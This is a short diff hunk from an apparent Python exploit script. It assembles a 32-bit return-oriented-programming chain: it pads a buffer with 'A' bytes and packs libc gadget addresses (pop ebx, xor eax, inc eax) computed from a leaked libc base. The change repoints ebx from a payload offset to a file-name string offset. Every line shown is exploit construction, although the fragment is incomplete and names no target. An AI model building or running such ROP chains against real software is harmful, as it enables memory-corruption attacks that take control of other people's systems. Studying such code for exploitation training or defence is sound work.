@@ -141,7 +141,7 @@ p = ''
 p += offset * 'A'
 
 p += pack('<I', pop_ebx_addr + base_libcaddr) # pop ebx ; ret
-p += pack('<I', buf_addr + payload_offset)    # data addr
+p += pack('<I', buf_addr + fileName_string_offset)    # data addr
 
 p += pack('<I', xor_eax_addr + base_libcaddr) # xor eax, eax ; ret
 p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
